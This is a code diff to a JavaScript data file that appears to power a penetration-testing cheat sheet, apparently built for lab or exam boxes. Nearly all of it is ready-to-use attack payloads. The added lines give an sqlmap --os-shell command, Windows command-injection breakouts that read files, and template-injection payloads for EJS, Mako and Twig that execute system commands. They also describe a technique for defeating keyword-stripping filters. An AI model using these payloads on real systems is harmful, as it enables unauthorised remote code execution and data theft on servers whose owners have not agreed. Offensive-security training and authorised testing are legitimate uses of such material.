@@ -339,7 +339,9 @@ window.METHODOLOGY = {
             { tool: "mysql-time", cmd: "' AND IF(1=1,SLEEP(5),0)-- -" },
             { tool: "mssql-time", cmd: "'; IF(1=1) WAITFOR DELAY '0:0:5'-- -" },
             { tool: "postgres-time", cmd: "' AND 1=(SELECT 1 FROM pg_sleep(5))-- -" },
-            { note: true, tool: "triage", cmd: "To speed a confirmed-blind extraction, sqlmap is the fast path — but reproduce/screenshot the key payloads by hand for the write-up:  sqlmap -u '{target_url}/page?id=1' --batch --level 2 --risk 2 --technique=BT" }
+            { note: true, tool: "triage", cmd: "To speed a confirmed-blind extraction, sqlmap is the fast path — but reproduce/screenshot the key payloads by hand for the write-up:  sqlmap -u '{target_url}/page?id=1' --batch --level 2 --risk 2 --technique=BT" },
+            { tool: "sqlmap -r", cmd: "sqlmap -r req.txt --batch --dbms=mssql --os-shell   # save the Burp request to req.txt; --os-shell drops an OS shell (MySQL FILE / MSSQL xp_cmdshell / PG)" },
+            { note: true, tool: "* marker (key)", cmd: "sqlmap confirms SQLi but only dumps DB NAMES, nothing deeper? It injected in the wrong place. Put a literal * where the value goes in req.txt (e.g. patientName=*) and re-run — it injects AT the *. This is the fix for 'found it but can't dump tables'." }
           ] },
         { label: "Read / write files via SQLi", sev: "crit",
           tell: "Often the straightest road to a proof file or a webshell.",
@@ -459,7 +461,8 @@ window.METHODOLOGY = {
             { tool: "sep", cmd: "|| id" },
             { tool: "sep", cmd: "& whoami" },
             { tool: "sub", cmd: "$(id)   ·   `id`" },
-            { tool: "newline", cmd: "%0aid" }
+            { tool: "newline", cmd: "%0aid" },
+            { tool: "windows", cmd: "& whoami   ·   | whoami   ·   if input is quoted, break out: C:\\backup\"& whoami   then  \"& type C:\\proof.txt  (dir C:\\ to locate it)" }
           ],
           xtell: "`id` proves it; now get an interactive shell and read proof. Start a listener (Reverse Shells tab) first. If output is blind or egress is filtered, exfil through your catcher.",
           exploit: [
@@ -616,7 +619,11 @@ window.METHODOLOGY = {
             { tool: "freemarker", cmd: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}" },
             { tool: "velocity", cmd: "#set($e=$x.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id'))" },
             { tool: "smarty", cmd: "{system('id')}   ·   {php}system('id');{/php}" },
-            { tool: "erb", cmd: "<%= `id` %>" }
+            { tool: "erb", cmd: "<%= `id` %>" },
+            { tool: "ejs (node)", cmd: "<%= process.mainModule.require('child_process').execSync('id').toString() %>" },
+            { tool: "mako (python)", cmd: "${self.module.cache.util.os.popen('id').read()}   # .system() shows only the exit code; use .popen().read()" },
+            { tool: "twig reduce", cmd: "{{[0]|reduce('system','id')}}   # newer Twig when filter()/map() are gone" },
+            { note: true, tool: "keyword stripped?", cmd: "If the engine/source strips process/require/exec ONCE (seen in EJS/Node boxes), interleave so one removal leaves it intact: pro<strip>cess → proprocesscess, requ<strip>ire → requrequireire. Download the source (backup/export feature) to see exactly what's filtered." }
           ] },
         { label: "Triage",
           tell: "Map candidate params fast, then hand-confirm.",
